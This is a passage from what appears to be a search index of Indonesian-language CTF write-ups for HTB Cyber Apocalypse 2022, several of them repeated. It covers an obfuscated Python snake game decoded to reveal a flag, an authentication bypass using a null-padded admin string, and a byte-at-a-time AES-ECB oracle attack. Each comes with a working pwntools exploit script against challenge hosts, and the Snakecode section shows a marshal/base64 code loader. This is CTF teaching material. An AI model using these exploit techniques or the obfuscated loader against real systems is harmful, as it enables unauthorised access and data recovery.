'eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj \\n II4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O \\n T/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1 \\n ap6X4g8LaaoZ3zFGfzFVE/UBTuovhA== \\n ' ) f4 = ll ( 'eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV \\n W3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8= \\n ' ) f5 = ll ( 'eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG \\n BhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j \\n ycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM \\n ' ) f6 = ll ( 'eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17 \\n RQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2 \\n DD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p \\n ' ) f7 = ll ( 'eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd \\n WPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7 \\n abb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV \\n 6Zn+Azn/L1k= \\n ' ) f8 = ll ( 'eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI \\n wkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7 \\n PxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj \\n L3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X \\n ' ) a1 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALI0C1U= \\n ' ) a2 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALBMC00= \\n ' ) a3 = ll ( 'eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A \\n iUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm \\n R4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X \\n gdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U= \\n ' ) a4 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALCJC04= \\n ' ) a5 = ll ( 'eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH \\n alAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99 \\n nt6PMA26l/SKxQ/XGxky \\n ' ) a6 = ll ( 'eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T \\n DMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN \\n xxM9 \\n ' ) a7 = ll ( 'eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p \\n jiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM \\n qhM6 \\n ' ) a8 = ll ( 'eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd \\n SNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q== \\n ' ) a9 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBAK+VC0o= \\n ' ) m0 = ll ( 'eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8 \\n DsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu \\n +F5V/Bw1Wpl0B7cCYGsZOw== \\n ' ) m1 = ll ( 'eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm \\n qAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi \\n /HOMRIklkJ38AF2QGOk= \\n ' ) m2 = ll ( 'eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM \\n QXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6 \\n y8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw= \\n ' ) def snake ( w ): r = i0 () c = i1 () f0 ( w ) d = ( 0 , 1 ) p = [( 5 , 5 )] pl = 1 s = 0 l = None while 1 : p , d , pl , l , s , w , c , r = m2 ( p , d , pl , l , s , w , c , r ) time . sleep ( 0.4 ) return i1 () . wrapper ( snake ) melakukan sedikit editing setelah melakukan percobaan, diperoleh edited flag.py #!/home/carloz/PycharmProjects/python2/venv/bin/python2 # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.18 (default, Feb 22 2022, 11:45:08) # [GCC 11.2.0] # Warning: this version of Python has problems handling the Python 3 byte type in constants properly. # Embedded file name: ./snake_obf.py # Compiled at: 2022-01-18 05:16:46 import marshal , types , time ll = types . FunctionType ( marshal . loads (( 'YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB \\n AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl \\n c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK \\n AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA \\n cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA \\n ' ) . decode ( 'base64' )), globals ()) i0 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh \\n ' ) i1 = ll ( 'eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB \\n CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1 \\n ' ) f0 = ll ( 'eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz \\n 8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5 \\n ' ) f1 = ll ( 'eJxLZmRgYIBhZyAu5gISNQwMWQwMzQwMwRogcT8wWcIKJNJTS5IzIFxmIFGemacBpBjARDE7kLAp \\n LknJzLMr4QCxcxJzk1IS7cDKQSoAvuUPJw== \\n ' ) f2 = ll ( 'eJx1kL1uwkAQhOfOBsxPQZUmL+DOEnWUBghEQQbFIESVglUkY5ECX+lHoMz7Jrt7HCgSOWlGO/rm \\n 1tbtIwBBY1b9zdYYkEFlcRqiAQoWxaginDJhjcUBijNQy+O24jxgfzsHdTxOFB8DtoqPoK7HPcXn \\n gCPFZ1BfcUGsdMA/lpc/fEqeUBq21Mp0L0rv/3grX/f5aELlbryVYzbXZnub7j42K5dcxslym7vu \\n Jby/zubrK1pMX9apPLOTraReqe9T3SlWd9ieakfl17OTb36OpFE/CDQDE5vHv7K/FKBNmA== \\n ' ) f3 = ll ( 'eJxVj00KAjEMhV+b8Q9040IZT9C9WxHEvRvBC1iFUhhk2sUIIwgexLWn1KQzI9qSl/DlhaZHDSDj \\n II4tR3ix1IBVyK1GXitImt/0l1JDSSih1rAZfIZyI4x9BRIkeKA8SLeF1Dl9clIHG+c9OakdZ35O \\n T/o+yiciZI2Hgvpt702Pt925Nx/HFZwSGbIYqaL87FS5aKSIgi5JbZR/F1WTrkZmk4QByypE64p1 \\n ap6X4g8LaaoZ3zFGfzFVE/UBTuovhA== \\n ' ) f4 = ll ( 'eJw1zDsKgEAMBNCJilb2drZ7AEuxsbfxBOIHFFkWNqWdF3eyYJEXkgxZcwB/jazYkkdwUeAVCAcV \\n W3F4MjTt7ISZyWVUS7KEsPtN7cW9e2ddLeKTIXk7gkSsSB91O/2g9uToLBELO0otH2W6Ez8= \\n ' ) f5 = ll ( 'eJxdjr0OwjAMhM9J+as6M7HTF0AsiKV7F54ACJUKVaiSjOnEi2MbISQGf4rtu3OuMwBSBVfDFQdG \\n BhzwMAgNMsER1s58+wJ3Hlm4Ai/z33YGE+A1IrNljnBBtiLYT1ZSf2sr6lMt19u+ZPYQkGDJqA0j \\n ycfap7+lBT/C2bveJ/UkEQ7KqByTGMbPKNQSpojiPMTEzqNKup2aKlnShramopJW5g2ipyUM \\n ' ) f6 = ll ( 'eJxdjTEOglAQRB98iMbEKxhLbkBjaLSwsrHWBEUJCRKULTT5VFzc3W9nMS+zk93ZqwNS1UK1VQ17 \\n RQ0CVcQUsTvljO4vWjEmSIRP8A4PXn3MlHKOea4DlxyzWMsOjXUHK/bpVXb1TWy855kF2gN9SPo2 \\n DD9+At8Zdm4YZorNIFXTFTI335aPS1UWtie28QV3xx4p \\n ' ) f7 = ll ( 'eJxtjz8LwjAQxV/S1mrRxcnZKat/qyAuOrv0E4ilIJRS2hsUCg7OfmcvubZTIe/97nKPcHkEADpd \\n WPWPjYCGj0Kj0fjIfHwVqiWIbzxbJ6SHEleQ1yf8ocQHFLSJqgKN+nTYVUUEGndNCiRG8UY3M7F7 \\n abb7TrAS7AVrQSw4CDaCreBo7CfJPvdy/nZeummZuyY3bHBWh2ynmtJncXaRLLaJem6HaqGiVlMV \\n 6Zn+Azn/L1k= \\n ' ) f8 = ll ( 'eJwljr0KAkEMhCf3o2hrIb7BlWIhFiKC1jYWViKHe+qKnHob0GKt7sVNcsV8ZDeTSc45gJ5oINqI \\n wkkQgTvQAvRdgwmO0BK2xxl+uTUTxBwugUtxT8EZIiHKZ4o21dZE7FLRe4yD+nMLixlchvG+0KU7 \\n PxR6EVjhSVDoKazt86MqG6uasr5WrI3SucCNbJPEp685keIy576aqktThVs3r0kf48s8r4c9Ogaj \\n L3SnIej8MrDz9aqLXJhPzwMNaURT4R/aUC0X \\n ' ) a1 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWwNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALI0C1U= \\n ' ) a2 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcWQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALBMC00= \\n ' ) a3 = ll ( 'eJw10EtLw0AUBeAzTWLqo74bML8gSyFdiotm40rEZF+kRyVtCGKmqzar/nHvHBDmfty5c+fBrB2A \\n iUVuUVkMG4MOnIARGIMJeAKm4BQ8Bc9UsfwcvABn/5VL8Aq81tINeAveKb/Hd47R4WDDTp5j7hEm \\n R4fsoS4yu+7Vh1e8yEYu5V7WciffZCl/5UpW8l162cuF3Mq1fJSUY5uYhTZFRvfZF+EvfOCnU89X \\n gdATGFLjafBs+2e1fJShY4jDomvcH1q4K9U= \\n ' ) a4 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcRQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBALCJC04= \\n ' ) a5 = ll ( 'eJxNzTELwjAQBeCXS4r6TzKJP6DUgruLq0s1S7BKIRkqJP/dd3Hp8D4ex3H3NAA6xjEXJo2kAHeH \\n alAF1aI6FINg8BIsZxTZdM5lM2/95i2PXCNBPBCvzeubLOR4yvp2bX6bS3P+LyppR/qUQ/wMea99 \\n nt6PMA26l/SKxQ/XGxky \\n ' ) a6 = ll ( 'eJwlzLsKwkAQheF/L0afw2qr4AOENOnT2NpEgyDGENgtFHbfPTNrcT6G4cw8DHCQeMkgiWchw81T \\n DMVSHMWTDdnytGTHu+Ea9G4MAkHPkxXaS9L1t/qrbtXlX1TiUehiml9rn046L9PnPk+99qJ+cewN \\n xxM9 \\n ' ) a7 = ll ( 'eJwlzLEKwjAQxvF/rhF9jk6Zig8gXdy7uLq0FqFYRUiGFpJ39y4O34/j+O4eDjhovOaqia2S4e4p \\n jiKUhuLJjiw8hex5Cbdgd0NQCHaeROnOydZbda9+q+u/aMSjcolpXj59Otm8ju9pHnvrRfvS8AMM \\n qhM6 \\n ' ) a8 = ll ( 'eJxLZmRgYABhJiB2BuJiPiBRw8CQwsgglsLEkM3EEKzBDBTyy2QFkplAzKABJkCaSkBEjgZcsJgd \\n SNgUl6Rk5tmVcIDYOYm5SSmJdmDFIBUAVDAM/Q== \\n ' ) a9 = ll ( 'eJxLZmRgYIBhZyAuZgESKYwMwRpMQIZfCUhcQQNIMGiAmGB+DoQPIorZgYRNcUlKZp5dCQeInZOY \\n m5SSaAdWDFIBAK+VC0o= \\n ' ) m0 = ll ( 'eJw1jTELwjAUhC9Jq/0VzhldBAfr4u7i6mYpFFSKCXRJp/7x3rsi5L5Avnsvrx0AS8PcmNQSGSg8 \\n DsWjBJQKS42nxwzMQSog09b/gsrs9AGP6LjhHr3tMfSn7TpH+yebfYtJHGXH7eknTpGAkPbEJeVu \\n +F5V/Bw1Wpl0B7cCYGsZOw== \\n ' ) m1 = ll ( 'eJw1zUEKAjEMBdCfdMQreIRuRwU3Mhv3bjzCDAOCitCAm7rqxU1+cZGX0v408wbAvy5e5eQYUAUm \\n qAnNHdASvsJLhSVUBpryoPG6Km5ZfPaah/hBnXXf29jbsbdDjl0W2Tdd6IN+6JwdkLJ1zsWW+2vi \\n /HOMRIklkJ38AF2QGOk= \\n ' ) m2 = ll ( 'eJxNjj8LAjEMxV96fz+Fk0NHdT5c3F1cD5c7BEHlsAWXdrov7kuKICS/0LyXpFMP4JcnZrgSEUgM \\n QXJIDVKLtcHokAWZKvsVUm0eGjr1rC3GCplBW/03Xpy2hM5bj4sXnjh7p4cUz30pO6+fiKouxtn6 \\n y8MehcH4MU7GtydgCB0xhDjfX8ey8mAzrYqyka18AW5IIKw= \\n ' ) def snake ( w ): r = i0 () c = i1 () f0 ( w ) d = ( 0 , 1 ) p = [( 5 , 5 )] pl = 1 s = 0 l = ( 1 , 1 ) tmp = d while 1 : p , d , pl , l , s , w , c , r = m2 ( p , d , pl , l , s , w , c , r ) pl += 1 p = [( 5 , 5 )] print ( \"p :\" , p ) print ( \"d :\" , d ) print ( \"pl :\" , pl ) print ( \"l :\" , l ) print ( \"s :\" , s ) print ( \"w :\" , w ) print ( \"c :\" , c ) print ( \"r :\" , r ) time . sleep ( 0.8 ) return i1 () . wrapper ( snake ) # flag = HTB{SuP3r_S3CRt_Sn4k3c0d3} $ chmod +x flag.py $ ./flag.py flag HTB{SuP3r_S3CRt_Sn4k3c0d3}","title":"Snakecode"},{"location":"ctf/writeup/comp/ca_spgd/","text":"Space pirate: Going Deeper \u00b6 sp_going_deeper glibc flag.txt $ file sp_going_deeper sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f094957db0c2401b2ba895893f94941d618463e, not stripped ld-linux-x86-64.so.2 libc.so.6 HTB{f4k3_fl4g_4_t35t1ng} Menggunakan tools decompiler, salah satunya IDA melihat detail fungsi admin_panel int __fastcall admin_panel ( __int64 a1 , __int64 a2 , __int64 a3 ) { __int64 v4 ; // [rsp+8h] [rbp-48h] char buf ; // [rsp+20h] [rbp-30h] __int64 v6 ; // [rsp+48h] [rbp-8h] v4 = a3 ; v6 = 0L L ; printf ( \"[*] Safety mechanisms are enabled! \\n \" \"[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \\n \" \"[*] If you want to continue, disable the mechanism or login as admin. \\n \" , a1 , a2 , a3 ); while ( v6 != 1 && v6 != 2 && v6 != 3 ) { printf ( a1DisableMechan ); v6 = read_num (); } if ( v6 == 1 ) { printf ( \" \\n [*] Input: \" ); } else { if ( v6 != 2 ) { puts ( \" \\n [!] Exiting.. \\n \" ); exit ( 6969 ); } printf ( \" \\n [*] Username: \" ); } read ( 0 , & buf , 0x39uLL ); if ( a1 == 3735928559L L && a2 == 322420958 && v4 == 322420463 || ! strncmp ( \"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\" , & buf , 0x34uLL ) ) { printf ( \" \\n %s[+] Welcome admin! The secret message is: \" , \" \\x1B [1;32m\" ); system ( \"cat flag*\" ); } else { printf ( \" \\n %s[-] Authentication failed! \\n \" , \" \\x1B [1;31m\" ); } return puts ( \" \\n [!] For security reasons, you are logged out.. \\n \" ); } input user akan dicompare dengan DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft len() = 51, sedangkan panjang strncmp 0x34 (52) strncmp ( \"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\" , & buf , 0x34uLL ) maka perlu ditambah dengan null bytes, sehingga diperoleh flag flag.py from pwn import * url = \"68.183.37.6\" port = 30286 # target = process(\"./sp_going_deeper\") target = remote ( url , port ) print ( target . recv ()) opsi = '1' print ( opsi ) target . sendline ( opsi ) print ( target . recv ()) inpt = b 'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft \\00 ' print ( inpt ) target . sendline ( inpt ) print ( target . recv ()) flag HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct} Referensi/Solusi lain \u00b6 https://heinandre.no/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper \u21a9","title":"Space pirate, Going Deeper"},{"location":"ctf/writeup/comp/ca_spgd/#space-pirate-going-deeper","text":"sp_going_deeper glibc flag.txt $ file sp_going_deeper sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f094957db0c2401b2ba895893f94941d618463e, not stripped ld-linux-x86-64.so.2 libc.so.6 HTB{f4k3_fl4g_4_t35t1ng} Menggunakan tools decompiler, salah satunya IDA melihat detail fungsi admin_panel int __fastcall admin_panel ( __int64 a1 , __int64 a2 , __int64 a3 ) { __int64 v4 ; // [rsp+8h] [rbp-48h] char buf ; // [rsp+20h] [rbp-30h] __int64 v6 ; // [rsp+48h] [rbp-8h] v4 = a3 ; v6 = 0L L ; printf ( \"[*] Safety mechanisms are enabled! \\n \" \"[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \\n \" \"[*] If you want to continue, disable the mechanism or login as admin. \\n \" , a1 , a2 , a3 ); while ( v6 != 1 && v6 != 2 && v6 != 3 ) { printf ( a1DisableMechan ); v6 = read_num (); } if ( v6 == 1 ) { printf ( \" \\n [*] Input: \" ); } else { if ( v6 != 2 ) { puts ( \" \\n [!] Exiting.. \\n \" ); exit ( 6969 ); } printf ( \" \\n [*] Username: \" ); } read ( 0 , & buf , 0x39uLL ); if ( a1 == 3735928559L L && a2 == 322420958 && v4 == 322420463 || ! strncmp ( \"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\" , & buf , 0x34uLL ) ) { printf ( \" \\n %s[+] Welcome admin! The secret message is: \" , \" \\x1B [1;32m\" ); system ( \"cat flag*\" ); } else { printf ( \" \\n %s[-] Authentication failed! \\n \" , \" \\x1B [1;31m\" ); } return puts ( \" \\n [!] For security reasons, you are logged out.. \\n \" ); } input user akan dicompare dengan DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft len() = 51, sedangkan panjang strncmp 0x34 (52) strncmp ( \"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\" , & buf , 0x34uLL ) maka perlu ditambah dengan null bytes, sehingga diperoleh flag flag.py from pwn import * url = \"68.183.37.6\" port = 30286 # target = process(\"./sp_going_deeper\") target = remote ( url , port ) print ( target . recv ()) opsi = '1' print ( opsi ) target . sendline ( opsi ) print ( target . recv ()) inpt = b 'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft \\00 ' print ( inpt ) target . sendline ( inpt ) print ( target . recv ()) flag HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}","title":"Space pirate: Going Deeper"},{"location":"ctf/writeup/comp/ca_spgd/#referensisolusi-lain","text":"https://heinandre.no/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper \u21a9","title":"Referensi/Solusi lain"},{"location":"ctf/writeup/comp/ca_tteo/","text":"The Three-Eyed Oracle \u00b6 chall.py from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random import signal import subprocess import socketserver FLAG = b 'HTB REDACTED ' prefix = random . randbytes ( 12 ) key = random . randbytes ( 16 ) def encrypt ( key , msg ): msg = bytes . fromhex ( msg ) crypto = AES . new ( key , AES . MODE_ECB ) padded = pad ( prefix + msg + FLAG , 16 ) return crypto . encrypt ( padded ) . hex () def challenge ( req ): req . sendall ( b 'Welcome to Klaus \\' s crypto lab. \\n ' + b 'It seems like there is a prefix appended to the real firmware \\n ' + b 'Can you somehow extract the firmware and fix the chip? \\n ' ) while True : req . sendall ( b '> ' ) try : msg = req . recv ( 4096 ) . decode () ct = encrypt ( key , msg ) except : req . sendall ( b 'An error occurred! Please try again!' ) req . sendall ( ct . encode () + b ' \\n ' ) class incoming ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 1500 ) req = self . request challenge ( req ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def main (): socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), incoming ) server . serve_forever () if __name__ == \"__main__\" : main () enkripsi menggunakan AES.ECB, memiliki kelemahan pada ECB, contoh enc = \"xxxxxxxxxxxxxxxx\" cipher = \"<block_enkripsi>\" enc = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" cipher = \"<block_enkripsi><block_enkripsi>\" # dengan nilai block_enkripsi yg sama ide dekripsi padded = prefix + msg + flag padded = ???????????? + xxxx + yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy + HTB{selamat_kamu_berhasil} output = <block_enkripsi_1> <block_enkripsi_2> <block_enkripsi_3> <block_enkripsi_2> <block_enkripsi_3> <block_enkripsi_4> yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy HTB{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyy(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyH TB{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyH(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyHT B{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyHT(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyHTB {... flag.py from pwn import * import string url = \"138.68.161.126\" port = 31192 target = remote ( url , port ) p = b '78787878' y = b '7979797979797979797979797979797979797979797979797979797979797979' st = string . printable f = b '' print ( target . recvuntil ( b '> ' ) . decode (), end = '' ) inp = p + y + y target . send ( inp ) print ( inp . decode ()) output = target . recv () . decode () print ( output , end = '' ) for i in range ( len ( inp )): y = y [: - 2 ] for j in st : f += hex ( ord ( j ))[ 2 :] . encode () s = p + y + f + y tmp = target . recvuntil ( b '> ' ) . decode () print ( tmp , end = '' ) target . send ( s ) print ( bytes . fromhex ( s . decode ())) resp = target . recv () . decode () print ( resp , end = '' ) if resp [ 32 : 96 ] == resp [ 96 : 160 ]: flag = bytes . fromhex ( f . decode ()) print ( flag ) break else : f = f [: - 2 ] # ^C manually flag","title":"The Three-Eyed Oracle"},{"location":"ctf/writeup/comp/ca_tteo/#the-three-eyed-oracle","text":"chall.py from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random import signal import subprocess import socketserver FLAG = b 'HTB REDACTED ' prefix = random . randbytes ( 12 ) key = random . randbytes ( 16 ) def encrypt ( key , msg ): msg = bytes . fromhex ( msg ) crypto = AES . new ( key , AES . MODE_ECB ) padded = pad ( prefix + msg + FLAG , 16 ) return crypto . encrypt ( padded ) . hex () def challenge ( req ): req . sendall ( b 'Welcome to Klaus \\' s crypto lab. \\n ' + b 'It seems like there is a prefix appended to the real firmware \\n ' + b 'Can you somehow extract the firmware and fix the chip? \\n ' ) while True : req . sendall ( b '> ' ) try : msg = req . recv ( 4096 ) . decode () ct = encrypt ( key , msg ) except : req . sendall ( b 'An error occurred! Please try again!' ) req . sendall ( ct . encode () + b ' \\n ' ) class incoming ( socketserver . BaseRequestHandler ): def handle ( self ): signal . alarm ( 1500 ) req = self . request challenge ( req ) class ReusableTCPServer ( socketserver . ForkingMixIn , socketserver . TCPServer ): pass def main (): socketserver . TCPServer . allow_reuse_address = True server = ReusableTCPServer (( \"0.0.0.0\" , 1337 ), incoming ) server . serve_forever () if __name__ == \"__main__\" : main () enkripsi menggunakan AES.ECB, memiliki kelemahan pada ECB, contoh enc = \"xxxxxxxxxxxxxxxx\" cipher = \"<block_enkripsi>\" enc = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" cipher = \"<block_enkripsi><block_enkripsi>\" # dengan nilai block_enkripsi yg sama ide dekripsi padded = prefix + msg + flag padded = ???????????? + xxxx + yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy + HTB{selamat_kamu_berhasil} output = <block_enkripsi_1> <block_enkripsi_2> <block_enkripsi_3> <block_enkripsi_2> <block_enkripsi_3> <block_enkripsi_4> yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyy HTB{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyy(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyyH TB{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyH(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyyHT B{... yyyyyyyyyyyyyyyy yyyyyyyyyyyyyHT(0..}) yyyyyyyyyyyyyyyy yyyyyyyyyyyyyHTB {... flag.py from pwn import * import string url = \"138.68.161.126\" port = 31192 target = remote ( url , port ) p = b '78787878' y = b '7979797979797979797979797979797979797979797979797979797979797979' st = string . printable f = b '' print ( target . recvuntil ( b '> ' ) . decode (), end = '' ) inp = p + y + y target . send ( inp ) print ( inp . decode ()) output = target . recv () . decode () print ( output , end = '' ) for i in range ( len ( inp )): y = y [: - 2 ] for j in st : f += hex ( ord ( j ))[ 2 :] . encode () s = p + y + f + y tmp = target . recvuntil ( b '> ' ) . decode () print ( tmp , end = '' ) target . send ( s ) print ( bytes . fromhex ( s . decode ())) resp = target . recv () . decode () print ( resp , end = '' ) if resp [ 32 : 96 ] == resp [ 96 : 160 ]: flag = bytes . fromhex ( f . decode ()) print ( flag ) break else : f = f [: - 2 ] # ^C manually flag","title":"The Three-Eyed 